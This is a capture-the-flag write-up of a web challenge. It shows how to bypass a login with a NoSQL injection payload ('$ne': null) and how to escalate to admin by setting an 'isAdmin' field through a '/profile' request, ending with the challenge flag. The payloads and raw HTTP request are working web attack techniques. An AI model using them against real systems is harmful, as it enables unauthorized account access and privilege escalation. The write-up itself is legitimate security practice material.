
Only admin can see the flag and our admin is cool.

Deploy instance and will be greeted with a login page

![[Pasted image 20240811024510.png]]

Inspecting the page
![[Pasted image 20240811024532.png]]

We can find a Username: `cool_hacker`

Fire up the burpsuite and turn on the intercept and turn on the foxyproxy

use default credentials or anything of your wish , I went `dkvv`:`dkvv`

intercept the login request


![[Pasted image 20240811024822.png]]
Forward it to the repeater

![[Pasted image 20240811024910.png]]

this was the response for the sent request
use anytype of no sql injection payload , I went with `{"username": {"$ne": null}, "password": {"$ne": null}}`

you can refer following [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) for more payloads

I got the following response which proves no sql vulnerability

![[Pasted image 20240811025302.png]]

Now lets perform vertical privilege escalation to gain superior access

We will try to upload an unauthorized credentials of ours and store it in the database

Now we need to find endpoint where the data is stored , basically it will be stored in `profile`

So change the header request from `POST /login` to `POST /Profile`  and enter  the following parameters as payload.

Note: you can keep password of your wish but the username and UserID must renmain same as it is in response.

``` bas

{"username":"cool_hacker",

 "password": "dkvv_hacker",

 "UserID": "12345",

 "$set": {"isAdmin": true}
}
```

![[Pasted image 20240811030043.png]]

Once you send this response , you must receive response saying `profile is successfully updated`
![[Pasted image 20240811030404.png]]

If you got any errors retrace your request for any syntax errors or mistakes

now you need to send a `POST/profile` request to get into the site



```bash

POST /profile HTTP/1.1
Host: kicyber2024-7b822ce55aed-web-0.chals.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://kicyber2024-7b822ce55aed-web-0.chals.io/
Content-Type: application/json
Content-Length: 97
Origin: https://kicyber2024-7b822ce55aed-web-0.chals.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"cool_hacker",
 "password": "dkvv_hacker",
 "UserID": "12345",
 "isAdmin": true
}

```

you will get following response

![[Pasted image 20240811030823.png]]

Append the following `/0sdas0dsad41dasdsadsadas0d1sadas.txt` to the initial URL to get the flag

![[Pasted image 20240811030946.png]]

The flag is

```Bash
KPMG_CTF{CsBTmilba0FTUzQBv6VAQ-S6kOWWeAvIeccOj9LEXkF74Wotw8z6V2p9hPFJsyVA36argqi5I-Z5ISCcX2UzqEQtgrrRWhDfxikC9HQ}
```